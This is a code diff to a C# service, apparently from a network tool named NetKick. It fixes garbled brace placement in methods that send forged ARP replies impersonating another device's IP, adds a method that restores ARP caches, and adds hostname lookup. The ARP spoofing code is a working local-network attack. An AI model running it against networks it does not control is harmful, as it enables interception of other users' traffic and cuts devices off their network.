@@ -1,4 +1,4 @@
-﻿using System.Net;
+﻿﻿using System.Net;
 using System.Net.NetworkInformation;
 using System.Collections.Concurrent;
 using NetKick.Models;
@@ -187,7 +187,7 @@ public class ArpService : IDisposable
                 _interfaceInfo.MacAddress,
                 target.MacAddress,
                 EthernetType.Arp);
-            ArpOperation.Response,
+
             var arpPacket = new ArpPacket(
                 ArpOperation.Response,
                 target.MacAddress,
@@ -196,20 +196,19 @@ public class ArpService : IDisposable
                 impersonate.IpAddress);      // Claiming to be this IP
 
             ethernetPacket.PayloadPacket = arpPacket;
-    }
             _device.SendPacket(ethernetPacket);
         }
         catch (Exception ex)
         {
             Log($"Error sending ARP spoof: {ex.Message}");
         }
-        var ethernetPacket = new EthernetPacket(
-            realDevice.MacAddress,
-            target.MacAddress,
-            EthernetType.Arp);
+    }
 
-        var arpPacket = new ArpPacket(
-            ArpOperation.Response,
+    /// <summary>
+    /// Sends a legitimate ARP reply to restore the target's ARP cache
+    /// </summary>
+    public void SendArpRestore(NetworkDevice target, NetworkDevice realDevice)
+    {
         try
         {
             // We send the packet from our MAC (required), but the ARP payload contains the real device's info
@@ -217,22 +216,36 @@ public class ArpService : IDisposable
                 _interfaceInfo.MacAddress,  // Source must be our MAC to send
                 target.MacAddress,
                 EthernetType.Arp);
-        _device.SendPacket(ethernetPacket);
+
             var arpPacket = new ArpPacket(
                 ArpOperation.Response,
                 target.MacAddress,
                 target.IpAddress,
                 realDevice.MacAddress,      // Real MAC in ARP payload
                 realDevice.IpAddress);       // Real IP in ARP payload
-    {
+
             ethernetPacket.PayloadPacket = arpPacket;
-        {
             _device.SendPacket(ethernetPacket);
         }
         catch (Exception ex)
         {
             Log($"Error sending ARP restore: {ex.Message}");
         }
+    }
+
+    /// <summary>
+    /// Attempts to resolve the hostname for a device
+    /// </summary>
+    private async Task ResolveHostname(NetworkDevice device)
+    {
+        try
+        {
+            var hostEntry = await Dns.GetHostEntryAsync(device.IpAddress);
+            device.Hostname = hostEntry.HostName;
+        }
+        catch
+        {
+            // Hostname resolution failed, leave as null
         }
     }
 
